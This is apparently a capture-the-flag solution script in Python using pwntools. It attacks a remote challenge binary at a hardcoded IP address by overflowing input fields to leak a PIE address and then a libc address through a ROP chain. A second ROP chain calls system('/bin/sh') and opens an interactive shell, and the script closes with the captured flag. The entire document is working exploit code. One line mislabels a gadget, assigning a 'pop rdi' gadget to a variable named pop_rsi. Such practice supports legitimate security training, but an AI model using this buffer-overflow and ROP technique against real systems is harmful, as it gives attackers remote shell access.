#!/usr/bin/env python
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "CRITICAL"
context.binary = elf = ELF("./chall_patched")
libc = elf.libc

pie_offset = 0x133e
libc_offset = 0x80970

gdbscript = """
b main
c
"""

p = remote("165.232.190.5", 1337)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

# edit
p.sendline(b"4")
p.sendlineafter(b"Enter new Name:", b"fuck")
p.sendlineafter(b"Enter the new address:", b"Z" * 44)

# play
p.sendline(b"3")
p.sendline(b"n")
p.sendline(b"n")

# recv belt
p.sendline(b"2")

p.recvuntil(b"Z"*44)
elf.address = unpack(p.recv(6), 'all') - pie_offset
print(f"{hex(elf.address)=}")

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rdi", "ret"])[0]
reg = elf.sym["reg"]
puts_plt = elf.sym["puts"]
puts_got = elf.got['puts']

payload = b'z' * 56
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(reg)

# reg
p.sendline(b"1")

p.sendlineafter(b"username:", b"A" * 20)
p.sendlineafter(b"age: ", b"4919")
p.sendlineafter(b"address: ", payload)

libc.address = unpack(p.recv(6), 'all') - libc_offset
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
print(f"{hex(libc.address)=}")

payload2 = b"T" * 56
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(pop_rdi+1)
payload2 += p64(system)

# reg
# p.sendline(b"1")

p.sendlineafter(b"username:", b"A" * 20)
p.sendlineafter(b"age: ", b"4919")
p.sendlineafter(b"address: ", payload2)

p.interactive()

# BugBase{l33t_!s_my_f@v0ur1t3_c0l0ur_53acb9}